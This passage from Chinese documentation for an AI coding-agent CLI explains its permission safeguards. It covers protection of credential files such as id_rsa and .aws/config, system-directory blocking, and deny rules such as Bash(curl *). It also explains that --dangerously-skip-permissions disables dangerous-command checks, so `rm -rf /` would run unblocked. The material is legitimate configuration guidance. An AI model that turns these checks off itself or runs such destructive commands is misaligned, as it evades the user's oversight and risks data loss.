`id_rsa` / `.ssh/` / `.aws/config` / `.kube/config` / `token.json` 等）。
同一层还有系统目录保护（`/etc/`、`/proc/`、`/sys/`、`/dev/`…）和 symlink 逃逸解析。

::: danger --dangerously-skip-permissions 的真实边界
它跳过**系统认定的危险**：上面的危险命令拦截、敏感文件保护、路径校验和 safetyCheck 都不再检查，
`rm -rf /` 在它下面不会被拦，只留一条审计记录。
但它**压不过人写下的拒绝**：`deny` 规则（含企业策略下发的）、`disallowedTools`、以及会话里点过的
「拒绝并记住」照常生效（`checker.ts` 的 `checkUserDenyUnderSkip`）——企业 `deny` 了 `Bash(curl *)`
的话，带这个参数 `curl` 一样被拒。
想让整个档位不可用，靠企业策略 `disableBypassPermissionsMode`（禁用后带这个参数启动会直接报错退出）；
它管的是「能不能用这一档」，不是「`deny` 规则生不生效」。
`-y` / `--yes` 不一样：它只自动批准普通的需确认操作，危险命令触发的确认仍然拦截。
`sc` 这个别名就等价于带上 `--dangerously-skip-permissions`，所以**别在重要仓库里用 `sc`**。
判断标准：这个目录里的东西全丢了你能不能接受。不能，就别用。
:::

## 常见问题

### 它一直问，怎么少问一点

按这个顺序试，从最安全的开始：

1. <kbd>Shift+Tab</kbd> 切到 `acceptEdits`——文件改动不问了，命令还问。多数人到这一步就够
2. 把你反复批准的那几条命令写进 `allow`：`/allow Bash(npm *) -p`
3. 还嫌烦再考虑 `auto` 模式，让风险分类替你判断
4. `--dangerously-skip-permissions` 是最后手段，且只在一次性 / 沙箱环境

### 规则写了但没生效

三个检查点，按顺序：

```bash
# 1. 启动时那行有没有出现，条数对不对
sid-code 2>&1 | grep "权限规则"
# → ● [CONFIG] 权限规则: 2条 allow, 2条 deny, 1条 ask

# 2. 路径规则的前缀写对了吗（/src/** 是项目根相对，//src/** 才是文件系统根）

# 3. 有没有被更高优先级的来源覆盖（企业策略 > --settings > 本地 > 项目 > 用户 > --allow-tool）
```

最常见的是第 2 条。`Read(/Users/me/proj/src/**)` 这种写法会被当成
「项目根下的 `Users/me/proj/src`」，永远匹配不上——要么改用 `//` 开头，要么写 `/src/**`。

### 非交互模式（`-p`）下工具全被拒了

`-p` 没有人能点确认，所以任何落到「需确认」的请求都会变成
`拒绝(非交互模式)`。脚本里要么用 `--allow-tool` 精确放行，
要么 `--permission-mode acceptEdits`，要么 `--dangerously-skip-permissions`（沙箱里）。

### 想知道某次到底是谁拦的

看日志里 `[PERMISSION]` 那行，括号里写了判定来源：

```text
bash(ls -la)  → 允许(工具级checkPermissions)
bash(sudo ls) → 需确认(危险命令: sudo 命令)
bash(sudo ls) → 拒绝(非交互模式)
write(...)    → 允许(acceptEdits模式)
```

`危险命令` 是安全层，`规则拒绝` 是你写的规则，`模式` 是权限档位。
三者对应三种不同的改法，别搞混。

### plan 模式下配了 allow 规则，为什么还是被拒

plan / deny-write 有一道**出口总闸**：任何放行在离开权限管线之前，都要再过一次模式硬约束。
所以 `allow` 规则不会让 plan 模式破例——配了 `allow: ["Bash(*)"]` 之后进 plan 模式，
**写类** bash 命令（`npm install` / `make` / `sed -i` / 输出重定向等）照样被拒
（提示「计划模式下只允许只读操作（bash 只允许只读命令…）」），`write` / `edit` 写非计划文件时同样如此。

`bash` 的**只读命令**是唯一的例外：`git log` / `git diff` / `ls` / `rg` 这类不写任何东西的命令
在 plan 下直接放行，**不需要** `allow` 规则（判据是代码里的只读命令集）。这样规划阶段能真的
看提交历史和改动，而不是改用 `read` 去拼 `.git` 目录里的文件。
`deny-write` 不跟着放开——它连只读 bash 也照旧拒绝。

唯一需要写盘的例外是计划文件本身（`~/.sid-code/plans/` 下那一份），否则它连计划都存不下来。

### 搜索词和抓取的网址会发往哪里

WebSearch 的搜索词由模型生成，可能夹带代码片段、文件路径或报错原文。
配了 `search.searxngUrl`（或环境变量 `SEARXNG_URL`）就发往那台 SearXNG，没配就发往 `duckduckgo.com`。
WebFetch 把模型要抓的整个 URL（含查询参数）发往对应网站。

想收紧，有两种做法：

- 换成自建 SearXNG，搜索词只到自己的服务器：

  ```json
  { "search": { "backend": "searxng", "searxngUrl": "https://searxng.internal.example.com" } }
  ```

- 用权限规则禁用或限定范围，例如 `"deny": ["WebSearch"]`、`"allow": ["WebFetch(domain:*.example.com)"]`。

全部出网通道的对照见[隐私与数据流向](/use/privacy#出网总表)。

## 相关

- [隐私与数据流向](/use/privacy) —— 什么会离开本机、隐私级别、脱敏边界

- [settings.json 字段](/ref/settings) —— `permissions` 段的完整字段类型与默认值
- [内置工具](/ref/tools) —— 规则里工具名的确切拼写
- [交互模式与键位](/use/interactive) —— <kbd>Shift+Tab</kbd> 及其他快捷键
- [Plan Mode 与 Todo](/use/plan-mode) —— plan 模式的完整用法
- [企业 policy 与安全边界](/team/policy) —— 用 `managed-settings.json` 做团队管控
